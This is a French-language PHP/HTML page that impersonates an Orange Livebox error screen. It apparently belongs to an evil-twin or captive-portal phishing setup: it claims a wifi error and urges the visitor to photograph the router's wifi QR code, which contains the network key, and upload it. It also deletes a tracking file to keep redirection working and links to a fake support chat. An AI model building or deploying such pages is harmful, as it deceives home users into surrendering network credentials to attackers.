<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
} 
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
		<title>Livebox</title>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="Content-language" content="fr">
		<link rel="stylesheet" type="text/css" href="/msftconnecttest/livebcss/styles.css">
		</head>
		<img src="/imageslvb/livebox1.png" width="300" height="100">
		<br>
		<br>
		<img src="/imageslvb/livebox2.png ">
		<br>
		<br>
		<br>
		<body>
		<br>
		<br>									
	<br>
	<br>
	<br>
<p>Code erreur 109: une erreur est survenue sur le réseau wifi.</p>
<br>
<br>
<body>
<p>Veuillez vous connecter en prenant en photo le QR code qui s'affiche sur votre box.<b>Cette méthode permet de connecter l'ensemble de vos équipements sans avoir à taper la clé de sécurité wifi pour chacun d'eux.</b>Le QR code wifi s'affiche via l'interface de votre Livebox en appuyant sur l'icône wifi puis, <b>Se connecter au wifi</b>.
<br>
<br>		
	<br>
	<center><IMG class="displayed" src="qrcode.png"></center>
	<br>
	<br>
<p>Appuyez sur le bouton <b>Choisir un fichier</b> ci-dessous pour prendre photo le QR code <b>en évitant les mouvements.</b>Une fois la photo prise, vous devez appuyer sur <b>Upload.</b>Si ça ne fonctionne pas et que votre navigateur internet n'est pas compatible, ne fermez pas cette fenêtre et utilisez l'appareil photo de votre mobile pour prendre en photo le QR code.Ensuite, revenez à cette fenêtre et choisissez l'image correspondante dans votre galerie puis valider en appuyant sur <b>Upload.</b></p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
<hr>			
</td>
</tr>
</table>
<h1>Aide</h1>
	<p>Besoin d'aide ? Un technicien en ligne peut vous répondre: <a href="/shout/liveboxtchat.php" target="_blank"><u>Aide en ligne</u> ...</a></p>	
<br>
<br>
		
	</body>
</html>